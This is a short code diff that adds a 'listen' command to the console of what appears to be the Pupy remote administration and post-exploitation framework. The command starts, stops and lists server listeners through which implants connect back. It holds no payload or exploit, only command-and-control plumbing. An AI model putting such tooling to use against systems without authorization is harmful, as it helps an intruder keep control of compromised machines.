@@ -666,6 +666,30 @@ class PupyCmd(cmd.Cmd):
         self.pupsrv.connect_on_client(arg)
         self.display("\n")
 
+    def do_listen(self, arg):
+        """ start/stop/show current listeners """
+        arg_parser = PupyArgumentParser(prog='listen', description='start/stop/show current listeners')
+        group = arg_parser.add_mutually_exclusive_group()
+        group.add_argument('-l', '--list', action='store_true', help='show current listeners')
+        group.add_argument('-a', '--add', nargs='+', help='start listener NAME [ARGS]')
+        group.add_argument('-r', '--remove', type=str, help='stop listener NAME')
+
+        try:
+            args = arg_parser.parse_args(shlex.split(arg))
+        except PupyModuleExit:
+            return
+
+        if args.add:
+            name, args = args.add[0], args.add[1:]
+            self.pupsrv.add_listener(name, ' '.join(args), motd=False)
+
+        elif args.remove:
+            self.pupsrv.remove_listener(args.remove)
+
+        else:
+            for listener in self.pupsrv.listeners.itervalues():
+                self.display_success(listener)
+
     def do_logging(self, arg):
         """ change pupysh logging level """
         arg_parser = PupyArgumentParser(prog='logging', description='change pupysh logging level')
